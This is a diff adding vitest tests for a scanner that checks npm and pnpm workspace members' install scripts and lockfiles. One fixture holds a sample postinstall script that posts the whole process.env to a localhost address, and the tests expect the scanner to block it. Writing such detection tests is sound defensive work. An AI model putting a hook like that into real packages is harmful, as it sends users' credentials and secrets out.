@@ -1,5 +1,9 @@
 import { describe, expect, it } from "vitest";
-import { pnpmfileFindings, projectScriptFindings } from "./project.ts";
+import {
+  pnpmfileFindings,
+  projectScriptFindings,
+  workspaceMembers,
+} from "./project.ts";
 
 const project = (files: Record<string, string>, links: string[] = []) => ({
   read: (path: string) => files[path.replace(/^\/p\//, "")],
@@ -61,6 +65,57 @@ describe("projectScriptFindings", () => {
 
   it("finds nothing without a package.json", () => {
     expect(severities({})).toEqual([]);
+  });
+});
+
+describe("workspace members (M6 review)", () => {
+  it("reads the members npm and pnpm lockfiles install", () => {
+    expect(
+      workspaceMembers(
+        JSON.stringify({
+          lockfileVersion: 3,
+          packages: {
+            "": { name: "repo" },
+            "packages/a": { name: "a", version: "1.0.0" },
+            "node_modules/a": { resolved: "packages/a", link: true },
+            "node_modules/zod": { version: "3.0.0", resolved: "https://x" },
+          },
+        }),
+      ),
+    ).toEqual(["packages/a"]);
+    expect(
+      workspaceMembers(
+        "lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies: {}\n\n  packages/b:\n    dependencies: {}\n",
+      ),
+    ).toEqual(["packages/b"]);
+  });
+
+  it("checks each member's install scripts, and warns on one outside the project", () => {
+    const files = {
+      "package.json": manifest({}),
+      "packages/a/package.json": manifest({ postinstall: "node setup.js" }),
+      "packages/a/setup.js":
+        'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
+    };
+    const found = (members: string[]) =>
+      projectScriptFindings("/p", project(files), { members }).map(
+        (f) => `${f.severity}:${f.file}`,
+      );
+    expect(found(["packages/a"])).toEqual(["block:packages/a/package.json"]);
+    expect(found(["../elsewhere"])).toEqual(["warn:package.json"]);
+  });
+
+  it("checks pnpm:devPreinstall only for pnpm", () => {
+    const files = {
+      "package.json": manifest({ "pnpm:devPreinstall": "node prep.js" }),
+      "prep.js": "console.log(1);",
+    };
+    const severity = (pnpm: boolean) =>
+      projectScriptFindings("/p", project(files), { pnpm }).map(
+        (f) => f.severity,
+      );
+    expect(severity(true)).toEqual(["warn"]);
+    expect(severity(false)).toEqual([]);
   });
 });
 
